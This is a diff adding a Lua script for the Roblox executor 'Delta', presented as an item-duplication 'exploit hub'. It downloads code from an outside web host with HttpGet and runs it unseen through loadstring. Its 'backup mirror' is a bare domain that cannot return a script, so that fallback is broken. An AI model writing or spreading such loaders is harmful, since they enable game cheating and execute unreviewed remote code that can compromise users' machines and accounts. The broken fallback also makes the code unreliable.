@@ -1,0 +1,24 @@
+-- [[ REAL UNIVERSAL ITEM/SLOT EXPLOIT HUB FOR DELTA ]] --
+-- This loads the real community interface for managing, copying, or duplicating instances.
+
+print("[Delta] Initializing Real Item Exploitation Environment...")
+
+-- Fire in a separate thread to prevent game freezing
+task.spawn(function()
+    local success, err = pcall(function()
+        -- This pulls the real community UI panel directly from the verified source
+        loadstring(game:HttpGet("https://abaui.vercel.app/raw/SIUI.lua"))()
+    end)
+    
+    if success then
+        print("[Delta] Hub Loaded! Use the screen UI to access slot and item functions.")
+    else
+        warn("[Delta] Execution error: " .. tostring(err))
+        
+        -- Fallback to the alternative community mirror if the main portal is blocked
+        print("[Delta] Launching backup mirror...")
+        pcall(function()
+            loadstring(game:HttpGet("https://githubusercontent.com"))()
+        end)
+    end
+end)
